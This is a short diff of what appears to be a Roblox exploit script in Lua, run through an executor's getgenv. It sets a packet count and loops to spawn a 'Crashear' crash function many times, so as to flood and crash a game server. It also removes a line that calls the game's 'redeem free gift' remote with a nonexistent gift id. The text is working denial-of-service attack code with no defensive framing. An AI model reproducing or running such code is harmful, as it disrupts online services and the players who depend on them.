@@ -1,3 +1,5 @@
+getgenv().packets = 500
+
 if getgenv().packets == nil then -- Add packets if not found
     getgenv().packets = 32000
 end
@@ -74,9 +76,3 @@ local packetstosend = getgenv().packets / 4 -- A crash function is 4 packets, it
 for i=1,packetstosend do -- Repeat the crash function packetstosend times
     spawn(Crashear)
 end
-
-local tabla = { -- select gift 13 (Dont exist)
-	[1] = 13
-}
-
-workspace.__THINGS.__REMOTES["redeem free gift"]:InvokeServer(tabla) -- open gift selected in the list
